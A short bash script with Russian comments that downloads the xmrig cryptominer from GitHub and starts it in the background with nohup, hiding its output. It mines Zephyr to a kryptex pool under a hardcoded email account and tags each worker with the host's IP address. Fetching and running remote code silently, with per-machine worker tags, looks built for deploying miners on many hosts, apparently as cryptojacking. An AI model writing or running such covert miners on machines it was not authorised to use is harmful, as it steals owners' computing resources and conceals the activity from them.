#!/bin/bash

# Загрузка xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-static-x64.tar.gz

# Распаковка архива
tar -xvzf xmrig-6.21.1-linux-static-x64.tar.gz

# Переход в директорию с xmrig
cd xmrig-6.21.1

# Получение IP-адреса с помощью hostname -I и сохранение в переменной number
number=$(hostname -I)

# Выполнение xmrig с введенным числом в фоновом режиме и перенаправлением вывода
nohup ./xmrig -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/$number -k --coin zephyr -a rx/0 > /dev/null 2>&1 &

# Вывод сообщения о запущенном процессе
echo "Slava Ukraini! -> $number"

# Возвращение в терминал
